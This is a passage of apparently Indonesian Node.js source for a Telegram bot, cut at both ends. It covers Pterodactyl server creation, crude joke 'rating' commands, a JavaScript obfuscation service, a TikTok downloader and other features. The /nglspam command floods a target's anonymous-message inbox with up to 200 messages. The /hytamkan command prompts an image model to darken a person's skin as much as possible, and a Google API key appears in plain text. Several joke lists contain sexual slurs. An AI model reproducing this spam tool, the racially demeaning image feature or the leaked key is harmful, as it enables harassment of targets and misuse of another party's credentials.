      { headers: { Authorization: `Bearer ${ctx.key}` } }
    );

    const vars = res.data.attributes.relationships?.variables?.data || [];
    let env = {};

    for (const v of vars) {
      env[v.attributes.env_variable] = v.attributes.default_value || "";
    }

    return env;
  } catch {
    return {};
  }
}

// ================= CREATE SERVER =================
async function createServer({ panel, name, password, ram, disk, cpu }) {
  const ctx = buildCtx(panel);

  const headers = {
    Authorization: `Bearer ${ctx.key}`,
    "Content-Type": "application/json"
  };

  const username = name.toLowerCase().replace(/[^a-z0-9]/g, "");
  const email = `${username}@mail.com`;

  const user = await axios.post(`${ctx.url}/api/application/users`, {
    username,
    email,
    first_name: username,
    last_name: "User",
    password
  }, { headers }).catch(() => null);

  if (!user) return null;

  const userId = user.data.attributes.id;

  const egg = await axios.get(
    `${ctx.url}/api/application/nests/${ctx.nest}/eggs/${ctx.egg}`,
    { headers }
  ).catch(() => null);

  if (!egg) return null;

  const e = egg.data.attributes;

  const env = await getEggEnv(panel);
  const allocationId = await getAllocation(panel);

  if (!allocationId) return null;

  const server = await axios.post(
    `${ctx.url}/api/application/servers`,
    {
      name: username,
      user: userId,
      egg: ctx.egg,
      docker_image: e.docker_image,
      startup: e.startup,
      environment: env,

      limits: { memory: ram, disk, cpu, swap: 0, io: 500 },

      feature_limits: { databases: 1, allocations: 1, backups: 1 },

      allocation: { default: allocationId }
    },
    { headers }
  ).catch(() => null);

  if (!server) return null;

  return {
    username,
    email,
    password,
    id: server.data.attributes.identifier
  };
}

// ================= CREATE COMMAND =================
const RAM = {
  "1gb":  { ram: 1024,  disk: 10240,  cpu: 50, text: "1GB" },
  "2gb":  { ram: 2048,  disk: 20480,  cpu: 60, text: "2GB" },
  "3gb":  { ram: 3072,  disk: 30720,  cpu: 70, text: "3GB" },
  "4gb":  { ram: 4096,  disk: 40960,  cpu: 80, text: "4GB" },
  "5gb":  { ram: 5120,  disk: 51200,  cpu: 90, text: "5GB" },
  "6gb":  { ram: 6144,  disk: 61440,  cpu: 100, text: "6GB" },
  "7gb":  { ram: 7168,  disk: 71680,  cpu: 110, text: "7GB" },
  "8gb":  { ram: 8192,  disk: 81920,  cpu: 120, text: "8GB" },
  "9gb":  { ram: 9216,  disk: 92160,  cpu: 130, text: "9GB" },
  "10gb": { ram: 10240, disk: 102400, cpu: 140, text: "10GB" },
  "unli": { ram: 0, disk: 0, cpu: 0, text: "Unlimited" }
};

async function handleCreate(msg, size, args) {
  const userId = msg.from.id;

  try {
    await bot.sendChatAction(userId, "typing");
  } catch (err) {
    return bot.sendMessage(
      msg.chat.id,
      `❌ START bot dulu di private chat: @${BOT_USERNAME}`
    );
  }

  const name = args[0];
  const pass = randomPass();

  tempCreate[userId] = {
    name,
    password: pass,
    ...RAM[size]
  };

  sendPanelSelector(msg.chat.id, userId);
}

bot.onText(
/\/(1gb|2gb|3gb|4gb|5gb|6gb|7gb|8gb|9gb|10gb|unli)(?:\s+(.+))?$/,
async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const chatType = msg.chat.type;

    const size = match?.[1];
    const name = match?.[2];

    // ================= VALIDASI SIZE =================
    if (!size || !RAM[size]) {
      return bot.sendMessage(chatId, "❌ SIZE RAM TIDAK VALID");
    }

    const ram = RAM[size];

    // ================= GROUP ONLY CHECK =================
    if (typeof isGroupOnly === "function") {
      if (isGroupOnly() && chatType === "private") {
        return bot.sendMessage(chatId, "❌ Bot ini hanya bisa digunakan di grup.");
      }
    }

    // ================= PREMIUM CHECK =================
    const isPremiumUser = typeof premium === "function"
      ? await premium(senderId)
      : false;

    const groupAllowed = typeof isGroupAllowed === "function"
      ? (chatType !== "private" ? isGroupAllowed(chatId) : false)
      : false;

    if (!isPremiumUser && !groupAllowed) {
      return bot.sendMessage(chatId,
        "❌ Fitur ini hanya untuk user Premium / Group premium."
      );
    }

    // ================= FORMAT CHECK =================
    if (!name) {
      return bot.sendMessage(chatId,
`<blockquote>❗ FORMAT SALAH

Contoh:
/${size} raraa
</blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    await handleCreate(msg, size, name.split(" "));

  } catch (err) {
    console.log("CMD ERROR:", err);
    bot.sendMessage(msg.chat.id, "❌ Terjadi error di command.");
  }
});

const LANGUAGES = {
  en: "🇬🇧 English",
  id: "🇮🇩 Indonesia",
  ar: "🇸🇦 Arabic",
  es: "🇪🇸 Spanish",
  fr: "🇫🇷 French",
  de: "🇩🇪 German",
  ja: "🇯🇵 Japanese",
  ru: "🇷🇺 Russian",
  zh: "🇨🇳 Chinese"
};


// Fungsi komentar berdasarkan nilai
function komentarTampan(nilai) {
  if (nilai >= 100) return "💎 Ganteng dewa, mustahil diciptakan ulang.";
  if (nilai >= 94) return "🔥 Ganteng gila! Mirip artis Korea!";
  if (nilai >= 90) return "😎 Bintang iklan skincare!";
  if (nilai >= 83) return "✨ Wajahmu memantulkan sinar kebahagiaan.";
  if (nilai >= 78) return "🧼 Bersih dan rapih, cocok jadi influencer!";
  if (nilai >= 73) return "🆒 Ganteng natural, no filter!";
  if (nilai >= 68) return "😉 Banyak yang naksir nih kayaknya.";
  if (nilai >= 54) return "🙂 Lumayan sih... asal jangan senyum terus.";
  if (nilai >= 50) return "😐 Gantengnya malu-malu.";
  if (nilai >= 45) return "😬 Masih bisa lah asal percaya diri.";
  if (nilai >= 35) return "🤔 Hmm... mungkin bukan harinya.";
  if (nilai >= 30) return "🫥 Sedikit upgrade skincare boleh tuh.";
  if (nilai >= 20) return "🫣 Coba pose dari sudut lain?";
  if (nilai >= 10) return "😭 Yang penting akhlaknya ya...";
  return "😵 Gagal di wajah, semoga menang di hati.";
}

function komentarCantik(nilai) {
  if (nilai >= 100) return "👑 Cantiknya level dewi Olympus!";
  if (nilai >= 94) return "🌟 Glowing parah! Bikin semua iri!";
  if (nilai >= 90) return "💃 Jalan aja kayak jalan di runway!";
  if (nilai >= 83) return "✨ Inner & outer beauty combo!";
  if (nilai >= 78) return "💅 Cantik ala aesthetic tiktok!";
  if (nilai >= 73) return "😊 Manis dan mempesona!";
  if (nilai >= 68) return "😍 Bisa jadi idol nih!";
  if (nilai >= 54) return "😌 Cantik-cantik adem.";
  if (nilai >= 50) return "😐 Masih oke, tapi bisa lebih wow.";
  if (nilai >= 45) return "😬 Coba lighting lebih terang deh.";
  if (nilai >= 35) return "🤔 Unik sih... kayak seni modern.";
  if (nilai >= 30) return "🫥 Banyak yang lebih butuh makeup.";
  if (nilai >= 20) return "🫣 Mungkin inner beauty aja ya.";
  if (nilai >= 10) return "😭 Cinta itu buta kok.";
  return "😵 Semoga kamu lucu pas bayi.";
}

// /cektampan
bot.onText(/^\/cektampan$/, (msg) => {
  const nilai = [10, 20, 30, 35, 45, 50, 54, 68, 73, 78, 83, 90, 94, 100][Math.floor(Math.random() * 14)];
  const teks = `
📊 *Hasil Tes Ketampanan*
👤 Nama: *${msg.from.first_name}*
💯 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarTampan(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// /cekcantik
bot.onText(/^\/cekcantik$/, (msg) => {
  const nilai = [10, 20, 30, 35, 45, 50, 54, 68, 73, 78, 83, 90, 94, 100][Math.floor(Math.random() * 14)];
  const teks = `
📊 *Hasil Tes Kecantikan*
👤 Nama: *${msg.from.first_name}*
💯 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarCantik(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// Nilai dan komentar untuk kekayaan
function komentarKaya(nilai) {
  if (nilai >= 100) return "💎 Sultan auto endorse siapa aja.";
  if (nilai >= 90) return "🛥️ Jet pribadi parkir di halaman rumah.";
  if (nilai >= 80) return "🏰 Rumahnya bisa buat konser.";
  if (nilai >= 70) return "💼 Bos besar! Duit ngalir terus.";
  if (nilai >= 60) return "🤑 Kaya banget, no debat.";
  if (nilai >= 50) return "💸 Kaya, tapi masih waras.";
  if (nilai >= 40) return "💳 Lumayan lah, saldo aman.";
  if (nilai >= 30) return "🏦 Kayanya sih... dari tampang.";
  if (nilai >= 20) return "🤔 Cukup buat traktir kopi.";
  if (nilai >= 10) return "🫠 Kaya hati, bukan dompet.";
  return "🙃 Duitnya imajinasi aja kayaknya.";
}

// Nilai dan komentar untuk kemiskinan
function komentarMiskin(nilai) {
  if (nilai >= 100) return "💀 Miskin absolut, utang warisan.";
  if (nilai >= 90) return "🥹 Mau beli gorengan mikir 3x.";
  if (nilai >= 80) return "😩 Isi dompet: angin & harapan.";
  if (nilai >= 70) return "😭 Bayar parkir aja utang.";
  if (nilai >= 60) return "🫥 Pernah beli pulsa receh?";
  if (nilai >= 50) return "😬 Makan indomie aja dibagi dua.";
  if (nilai >= 40) return "😅 Listrik token 5 ribu doang.";
  if (nilai >= 30) return "😔 Sering nanya *gratis ga nih?*";
  if (nilai >= 20) return "🫣 Semoga dapet bansos.";
  if (nilai >= 10) return "🥲 Yang penting hidup.";
  return "😵 Gaji = 0, tagihan = tak terbatas.";
}

// /cekkaya
bot.onText(/^\/cekkaya$/, (msg) => {
  const nilai = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100][Math.floor(Math.random() * 10)];
  const teks = `
💵 *Tes Kekayaan*
👤 Nama: *${msg.from.first_name}*
💰 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarKaya(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// /cekmiskin
bot.onText(/^\/cekmiskin$/, (msg) => {
  const nilai = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100][Math.floor(Math.random() * 10)];
  const teks = `
📉 *Tes Kemiskinan*
👤 Nama: *${msg.from.first_name}*
📉 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarMiskin(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// Fungsi komentar berdasarkan skor
function komentarJanda(nilai) {
  if (nilai >= 100) return "🔥 Janda premium, banyak yang ngantri.";
  if (nilai >= 90) return "💋 Bekas tapi masih segel.";
  if (nilai >= 80) return "🛵 Banyak yang ngajak balikan.";
  if (nilai >= 70) return "🌶️ Janda beranak dua, laku keras.";
  if (nilai >= 60) return "🧕 Pernah disakiti, sekarang bersinar.";
  if (nilai >= 50) return "🪞 Masih suka upload status galau.";
  if (nilai >= 40) return "🧍‍♀️ Janda low-profile.";
  if (nilai >= 30) return "💔 Ditinggal pas lagi sayang-sayangnya.";
  if (nilai >= 20) return "🫥 Baru ditinggal, masih labil.";
  if (nilai >= 10) return "🥲 Janda lokal, perlu support moral.";
  return "🚫 Masih istri orang, bro.";
}

// /cekjanda
bot.onText(/^\/cekjanda$/, (msg) => {
  const nilai = Math.floor(Math.random() * 101); // 0 - 100
  const teks = `
👠 *Tes Kejandaan*
👤 Nama: *${msg.from.first_name}*
📊 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarJanda(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// Fungsi komentar sesuai skor pacar
function komentarPacar(nilai) {
  if (nilai >= 95) return "💍 Sudah tunangan, tinggal nikah.";
  if (nilai >= 85) return "❤️ Pacaran sehat, udah 3 tahun lebih.";
  if (nilai >= 70) return "😍 Lagi anget-angetnya.";
  if (nilai >= 60) return "😘 Sering video call tiap malam.";
  if (nilai >= 50) return "🫶 Saling sayang, tapi LDR.";
  if (nilai >= 40) return "😶 Dibilang pacaran, belum tentu. Tapi dibilang nggak, juga iya.";
  if (nilai >= 30) return "😅 Masih PDKT, nunggu sinyal.";
  if (nilai >= 20) return "🥲 Sering ngechat, tapi dicuekin.";
  if (nilai >= 10) return "🫠 Naksir diam-diam.";
  return "❌ Jomblo murni, nggak ada harapan sementara ini.";
}

// Command
bot.onText(/^\/cekpacar$/, (msg) => {
  const nilai = Math.floor(Math.random() * 101); // nilai 0-100
  const teks = `
💕 *Tes Kepacaran*
👤 Nama: *${msg.from.first_name}*
📊 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarPacar(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

bot.onText(/^\/cekkhodam(?: (.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const nama = (match[1] || '').trim();

  if (!nama) {
    return bot.sendMessage(chatId, 'ɴᴀᴍᴀɴʏᴀ ᴍᴀɴᴀ ᴀɴᴊᴇɴɢ🤓');
  }

  const khodamList = [
    'si ganteng',
    'si jelek',
    'anomali bt script',
    'kang hapus sumber',
    'maling pulpen', 
    'kak gem', 
    'suster ngesot', 
    'kang ngocok',
    'Anomali maklu',
    'orang gila',
    'anak rajin',
    'jadi lc', 
    'suka ngentot tiap hari', 
    'tukang caper',
    'anak cerdas',
    'lonte gurun',
    'dugong',
    'macan yatim',
    'buaya darat',
    'kanjut terbang',
    'kuda kayang',
    'janda salto',
    'lonte alas',
    'jembut singa',
    'gajah terbang',
    'kuda cacat',
    'jembut pink',
    'sabun bolong',
    'ambalambu',
    'megawati',
    'jokowi', 
    'polisi', 
    'sempak bolong', 
    'bh bolong',
  ];

  const pickRandom = (list) => list[Math.floor(Math.random() * list.length)];

  const hasil = `
<blockquote><b>𖤐 ʜᴀsɪʟ ᴄᴇᴋ ᴋʜᴏᴅᴀᴍ:</b>
╭───────────────────
├ •ɴᴀᴍᴀ : ${nama}
├ •ᴋʜᴏᴅᴀᴍɴʏᴀ : ${pickRandom(khodamList)}
├ •ɴɢᴇʀɪ ʙᴇᴛ ᴊɪʀ ᴋʜᴏᴅᴀᴍɴʏᴀ
╰───────────────────
<b>ɴᴇxᴛ ᴄᴇᴋ ᴋʜᴏᴅᴀᴍɴʏᴀ sɪᴀᴘᴀ ʟᴀɢɪ.</b>
</blockquote>
  `;

  bot.sendMessage(chatId, hasil, { parse_mode: 'HTML' });
});

bot.onText(/\/enc/, async (msg) => {
    const chatId = msg.chat.id;
    const replyMessage = msg.reply_to_message;
    const senderId = msg.from.id;
    const userId = msg.from.id;
    const randomImage = getRandomImage();
    const isPremium = await premium (senderId);    
    const chatType = msg.chat.type;
           
            
      if (isGroupOnly() && chatType === 'private') {
      return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/enc')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

  //cekprem//
if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}
    console.log(`Perintah diterima: /encrypthard dari pengguna: ${msg.from.username || msg.from.id}`);

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, '😡 Silakan Balas/Tag File .js\nBiar Gua Gak Salah Tolol.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    // Mendapatkan link file
    const fileLink = await bot.getFileLink(fileId);
    const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
    const codeBuffer = Buffer.from(response.data);

    // Simpan file sementara
    const tempFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(tempFilePath, codeBuffer);

    // Enkripsi kode menggunakan JsConfuser
    bot.sendMessage(chatId, "⌛️Sabar...\n Lagi Di Kerjain Sama iif Encryptnya...");
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const originalString = "肀ThunderVisIsback舀" + "肀ThunderVisIsback舀";
            function removeUnwantedChars(input) {
                return input.replace(/[^a-zA-Z肀VampireIsBack舀]/g, '');
            }
            function randomString(length) {
                let result = '';
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                for (let i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * characters.length));
                }
                return result;
            }
            return removeUnwantedChars(originalString) + randomString(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0.0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1.0,
        shuffle: { hash: 0.0, true: 0.0 },
        stack: true,
        controlFlowFlattening: 1.0,
        opaquePredicates: 0.9,
        deadCode: 0.0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    });

    // Simpan hasil enkripsi
    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);

    // Kirim file terenkripsi ke pengguna
    bot.sendDocument(chatId, encryptedFilePath, {
        caption: `
❒━━━━━━༽𝗦𝘂𝗰𝗰𝗲𝘀𝘀༼━━━━━━❒
┃ - 𝗘𝗻𝗰𝗿𝘆𝗽𝘁 𝗛𝗮𝗿𝗱 𝗝𝘀𝗼𝗻 𝗨𝘀𝗲𝗱 -
❒━━━━━━━━━━━━━━━━━━━━❒`
    });
});


bot.onText(/^\/iqc(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  // ===== VALIDASI INPUT =====
  if (!text) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah!\n\nGunakan:\n`/iqc teks`\n\nContoh:\n`/iqc Hai`",
      { parse_mode: "Markdown" }
    );
  }

  // ===== BLACKLIST COMMAND =====
  if (blacklistedCommands.includes('/iqc')) {
    return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
  }

  // ===== BOT STATUS =====
  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  const loading = await bot.sendMessage(
    chatId,
    "📱 Membuat IQC...",
    { parse_mode: "Markdown" }
  );

  try {
    // ===== API LANGSUNG DI SINI =====
    const apiUrl = `https://api-faa.my.id/faa/iqc?prompt=${encodeURIComponent(text)}`;

    const response = await fetch(apiUrl);
    if (!response.ok) throw new Error("Gagal ambil hasil dari API IQC");

    const buffer = Buffer.from(await response.arrayBuffer());

    // ===== KIRIM HASIL GAMBAR =====
    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ *IQC Generator*\n\n📝 Teks:\n${text}`,
      parse_mode: "Markdown",
    });

    bot.deleteMessage(chatId, loading.message_id);
  } catch (err) {
    console.error("[IQC ERROR]", err);
    bot.editMessageText(
      "⚠️ Gagal membuat IQC.\nCoba lagi nanti.",
      {
        chat_id: chatId,
        message_id: loading.message_id,
      }
    );
  }
});

bot.onText(/\/cekid/, (msg) => {
  const chatId = msg.chat.id;
  const sender = msg.from.username;
  const randomImage = getRandomImage();
  const id = msg.from.id;
  const owner = "7127454409"; // Ganti dengan ID pemilik bot
  const text12 = `Halo @${sender}
╭────⟡
│ 👤 Nama: @${sender}
│ 🆔 ID: ${id}
╰────⟡
<blockquote>by @raraa_imuppp</blockquote>
`;
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }],
        ],
      ],
    },
  };
  bot.sendPhoto(chatId, randomImage, {
    caption: text12,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});
bot.onText(/\/hytamkan/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id;
const senderId = msg.from.id;
const randomImage = getRandomImage();
const isPremium = await premium (senderId);
const chatType = msg.chat.type;
           
            
 if (isGroupOnly() && chatType === 'private') {
 return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/hytamkan')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}
  
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(chatId, `<blockquote>⚠️ Reply foto dengan caption /hytamkan</blockquote>`, {
    parse_mode: "HTML"
    });
  }

  bot.sendMessage(chatId, `<blockquote>⏱️ Sedang memproses...</blockquote>`, {
    parse_mode: "HTML"
    });

  try {
    const fileId = msg.reply_to_message.photo.pop().file_id;
    const file = await bot.getFile(fileId);

    const url = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    const response = await fetch(url);
    const buffer = Buffer.from(await response.arrayBuffer());
    const base64Image = buffer.toString("base64");

    const genAI = new GoogleGenerativeAI("AIzaSyDoMqqCBjo5wF4YLVnIJTX3h1hISR6NPKo"); // ganti API key
    const promptText =
      "Ubahlah Karakter Dari Gambar Tersebut Diubah Kulitnya Menjadi Hitam se hitam-hitam nya";

    const contents = [
      { text: promptText },
      { inlineData: { mimeType: "image/jpeg", data: base64Image } },
    ];

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: { responseModalities: ["Text", "Image"] },
    });

    const result = await model.generateContent(contents);

    let resultImage;
    for (const part of result.response.candidates[0].content.parts) {
      if (part.inlineData) {
        resultImage = Buffer.from(part.inlineData.data, "base64");
      }
    }

    if (resultImage) {
      const tempPath = `./hytam_${Date.now()}.png`;
      fs.writeFileSync(tempPath, resultImage);

      await bot.sendPhoto(chatId, tempPath, {
        caption: `<blockquote>✅ berhasil menghitamkan</blockquote>`,
        parse_mode: "HTML",
      });

      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      bot.sendMessage(chatId, `<blockquote>❌ Gagal memproses gambar.</blockquote>`, {
    parse_mode: "HTML"
    });
    }
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `<blockquote>⚠️ Error: ${error.message}</blockquote>`, {
    parse_mode: "HTML"
    });
  }
});
async function tiktok(url) {
  try {
    const encodedParams = new URLSearchParams();
    encodedParams.set("url", url);
    encodedParams.set("hd", "1");

    const response = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": "current_language=en",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      },
    });

    if (!response.data || !response.data.data) {
      throw new Error("Gagal mendapatkan data TikTok");
    }

    const videos = response.data.data;
    return {
      title: videos.title,
      cover: videos.cover,
      origin_cover: videos.origin_cover,
      no_watermark: videos.play,
      watermark: videos.wmplay,
      music: videos.music,
    };
  } catch (error) {
    throw error;
  }
}

bot.onText(/^\/tiktok(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const url = match[1];
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
           
            
  if (isGroupOnly() && chatType === 'private') {
  return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/tiktok')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}

  if (!url) {
    return bot.sendMessage(chatId, `<blockquote>☘️ Link TikTok-nya Mana?</blockquote>`, { 
    parse_mode: "HTML" 
    });
  }

 
  const urlRegex = /^(https?:\/\/)?([\w.-]+)+(:\d+)?(\/\S*)?$/;
  if (!urlRegex.test(url)) {
    return bot.sendMessage(chatId, `<blockquote>⚠️ Itu Bukan Link Yang Benar</blockquote>`, { 
    parse_mode: "HTML" 
    });
  }

  bot.sendMessage(chatId, `<blockquote>⏳ Tunggu sebentar, sedang mengambil video...</blockquote>`, {
        parse_mode: "HTML"
        });

  try {
  const res = await tiktok(url);

 
  let caption = `🎬 Judul: ${res.title}`;
     if (caption.length > 1020) {
     caption = caption.substring(0, 1017) + "...";
  }

await bot.sendVideo(chatId, res.no_watermark, { caption });
 
  if (res.music && res.music.trim() !== "") {
    await bot.sendAudio(chatId, res.music, { title: "tiktok_audio.mp3" });
  } else {
    await bot.sendMessage(chatId, `<blockquote>🎵 Video ini tidak memiliki audio asli.</blockquote>`, {
        parse_mode: "HTML"
        });
  }

} catch (error) {
  console.error(error);
  bot.sendMessage(chatId, `<blockquote>⚠️ Terjadi kesalahan saat mengambil video TikTok. Coba lagi nanti.</blockquote>`, {
        parse_mode: "HTML"
        });
}
});
bot.onText(/\/nglspam (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].trim().split(" ");
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
                      
 if (isGroupOnly() && chatType === 'private') {
 return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/nglspam')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}
  
    if (args.length < 3) {
      return bot.sendMessage(
        chatId, `<blockquote>Format Salah!\n\nContoh: /ngl link text jumlah\n/ngl https://ngl.link/angkasa lu jelek 20 </blockquote>`, {
        parse_mode: 'HTML' 
        });
    }

    const link = args[0];
    const jumlah = parseInt(args[args.length - 1]);
    const pesan = args.slice(1, -1).join(" ");

    if (!/^https?:\/\/ngl\.link\//i.test(link)) {
      return bot.sendMessage(chatId, `<blockquote>❌ Link NGL tidak valid! Pastikan formatnya https://ngl.link/username</blockquote>`, {
        parse_mode: 'HTML' 
        });
    }

    if (isNaN(jumlah) || jumlah < 1 || jumlah > 200) {
      return bot.sendMessage(chatId, `<blockquote>❌ Jumlah pesan harus angka 1 - 100.</blockquote>`, {
        parse_mode: 'HTML' 
        });
    }

    try {
      const processingMsg = await bot.sendMessage(chatId, `<blockquote>⏳ Mengirim ${jumlah} pesan ke NGL...</blockquote>`, {
        parse_mode: 'HTML' 
        });

      const apiUrl = `https://api.siputzx.my.id/api/tools/ngl`;
      let success = 0, failed = 0;

      for (let i = 0; i < jumlah; i++) {
        try {
          await axios.post(apiUrl, {
            link: link,
            text: pesan
          }, { timeout: 10000 });

          success++;
          await new Promise(r => setTimeout(r, 1500));
        } catch {
          failed++;
        }
      }

      await bot.deleteMessage(chatId, processingMsg.message_id);

      await bot.sendMessage(
        chatId,
        `<blockquote>✅ Selesai Kirim Pesan NGL\n\n📩 Pesan: "${pesan}"\n📦 Total: ${jumlah}\n☑️ Berhasil: ${success}\n❌ Gagal: ${failed}</blockquote>`, {
        parse_mode: 'HTML' 
        });

    } catch (err) {
      console.error('[NGL ERROR]', err.message);
      bot.sendMessage(chatId, `<blockquote>❌ Gagal kirim ke NGL: ${err.message}</blockquote>`, {
        parse_mode: 'HTML' 
        });
    }
});

// =====================
// Utils
// =====================
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function msToTime(ms) {
  if (!Number.isFinite(ms)) return "-";
  const totalSec = Math.floor(ms / 1000);
  const h = Math.floor(totalSec / 3600);
  const m = Math.floor((totalSec % 3600) / 60);
  const s = totalSec % 60;
  const pad = (n) => String(n).padStart(2, "0");
  return h > 0 ? `${h}:${pad(m)}:${pad(s)}` : `${m}:${pad(s)}`;
}

function pickQuote() {
  const quotes = [
    "Kalau capek, istirahat… musiknya biar nemenin.",
    "Pelan-pelan ya, semua akan baik-baik saja.",
    "Kamu nggak sendirian, ada lagu yang ngerti.",
    "Kadang kita cuma butuh lagu yang pas.",
    "Biar nada yang bicara, kamu cukup dengar.",
    "Malam ini, biar musik yang peluk kamu.",
    "Tenang… lagu ini buat kamu yang lagi kuat-kuatnya.",
    "Kalau dunia berisik, dengar ini pelan-pelan.",
    "Semesta kadang diam, tapi musik selalu jawab.",
    "Jangan buru-buru sembuh, nikmati prosesnya.",
    "Kalau hati lagi penuh, biar lagu yang mengurai.",
    "Ada rindu yang cuma bisa dijelaskan lewat nada.",
    "Kalau kamu jatuh, jatuhnya pelan-pelan ya.",
    "Kamu hebat, walau hari ini terasa berat.",
    "Satu lagu, seribu rasa.",
    "Kita nggak harus baik-baik saja setiap waktu.",
    "Simpan tenangmu, walau sebentar.",
    "Kalau lelah, tarik napas… lalu putar lagu ini.",
    "Malam panjang, tapi kamu lebih kuat.",
    "Kadang yang kita butuh cuma ditemani, bukan dinasehati.",
    "Biar musik jadi rumah saat dunia terasa asing.",
    "Senyum dulu… meski tipis.",
    "Kamu pantas bahagia, pelan-pelan aja.",
